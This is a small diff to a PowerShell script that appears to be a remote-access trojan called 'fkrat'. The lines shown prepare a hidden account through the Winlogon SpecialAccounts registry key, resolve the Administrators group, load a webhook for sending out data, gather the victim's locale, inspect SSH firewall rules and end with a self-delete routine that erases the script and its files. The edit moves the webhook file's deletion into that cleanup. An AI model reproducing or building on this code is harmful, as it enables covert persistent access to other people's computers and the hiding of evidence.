@@ -54,7 +54,6 @@ $uName = "fkrat"
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
 $Webhook = Get-Content ./webhook
-Remove-Item "webhook"
 $language = (Get-WinUserLanguageList)[0].autonym
 $country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
 $country = $country.Substring(0, $country.length - 2)
@@ -101,4 +100,5 @@ Get-NetFirewallRule -Name *ssh*
 
 ## Self Delete
 Remove-Item "$PSScriptRoot/$env:computername.fk" 
+Remove-Item "$PSScriptRoot/webhook"
 Remove-Item $PSCommandPath -Force 
